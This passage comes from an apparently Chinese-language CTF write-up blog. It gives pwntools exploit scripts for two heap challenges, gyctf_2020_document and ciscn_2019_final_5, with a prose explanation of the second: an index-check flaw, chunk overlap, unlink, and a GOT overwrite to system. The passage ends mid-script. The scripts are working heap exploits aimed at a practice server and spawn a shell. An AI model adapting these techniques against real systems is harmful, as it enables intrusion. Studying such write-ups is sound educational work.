LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_document'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27819</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x1207)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">,</span> sex<span class=\"token operator\">=</span><span class=\"token string\">b'W'</span><span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input name\\n'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input sex\\n'</span><span class=\"token punctuation\">,</span> sex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input information\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me your index : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">,</span> sex<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me your index : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'change sex?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'Y'</span><span class=\"token keyword\">if</span> sex <span class=\"token keyword\">else</span> <span class=\"token string\">b'N'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'information\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Give me your index : \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>ma_ <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mh_a <span class=\"token operator\">=</span> ma_ <span class=\"token operator\">-</span> <span class=\"token number\">0x68</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mh_a:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>realloc_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>oglist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x45216</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4526a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf02a4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf1147</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> oglist<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token operator\">-</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>realloc_a<span class=\"token operator\">+</span><span class=\"token number\">8</span>  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_final_5\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_final_5\">#</a> *ciscn_2019_final_5</h1>\n<p>** 考点：** 临界条件，overlap, unlink, tcache dup?</p>\n<p>** 版本：**libc-2.27_3ubuntu1_amd64</p>\n<p>这题算是很有特色的一题。首先保护未全开，pie 未开，relro 未开，可以利用 got 表。</p>\n<p><img data-src=\"./image-20231204203834301.png\" alt=\"image-20231204203834301\"></p>\n<p>总所周知，堆块的分配会进行对齐，因此其地址低三位将固定为 0。而 chunk 头部的 size 也被系统用来存放包括前块 inuse 等的状态码。对于 64 位系统，chunk 是以 0x10 的大小增长，所以二进制第 4 位也为 0 了。</p>\n<p>这道题则是利用这一点，将 chunk 的编号与 chunk 的地址存放在同一个 64 位整数，低 4 位则为编号。因为只有 4 位二进制可供利用，所以其编号范围即为 0~15，每次程序调用块时，会根据用户输入的编号与地址数组中每个元素的低 4 位进行比较，若相同则选中其并操作。</p>\n<p>编号仅能为 0~15，程序因此有对输入的编号进行检测，但漏洞也就出在这。分配函数中的检测不严谨，只当 <code>index&gt;0x11</code>  时保错。若输入为 16，那么可以通过检测。而在存放地址时，低 5 位定会被修改为 1。如果原先块的地址第 5 位为 0，在被强制修改为 1 后，之后操作时，则会对用户地址 + 10 的地方进行操作。因此便可以越界操作 0x10 个字节，构成 overlap。</p>\n<p><img data-src=\"./image-20231204204856295.png\" alt=\"image-20231204204856295\"></p>\n<p>之后就是喜闻乐见的 unlink 实现任意地址读写。但这里并不完全是任意地址，只能对低 4 位为 0 的地址进行读写。例如，要对 free 的 got 表进行改写，那只能修改地址为往前 8 字节处，然后写入时再加上 8 字节偏移。</p>\n<p><img data-src=\"./image-20231204205153497.png\" alt=\"image-20231204205153497\"></p>\n<p>由于没有输出 chunk 的函数，这里先利用释放函数，将 free 的 got 表指向 put 的 plt，然后泄露 libc 地址，再将 free 的 got 表指向 system 函数，最后释放含 <code>&quot;/bin/sh&quot;</code>  字符串的 chunk。</p>\n<p>注意一点，释放 chunk 之后，会清空数组内的地址，此时其低 4 位为 0，因此当输入编号 0 时会选择该空地址进行操作。我们利用 free 函数输出 ptr+0 存放地址对应内容，并将 ptr+0 处清空。由于任意地址读写利用了 ptr+3 处的地址，其对应编号为 0。所以第二次任意地址读写前，需分配一次块，将 ptr+0 处空地址覆盖，以便 ptr+3 正常利用。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_final_5'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27135</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400E89'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'index: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x6020E0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> ptr<span class=\"token punctuation\">,</span> ptr<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x420</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token operator\">|</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 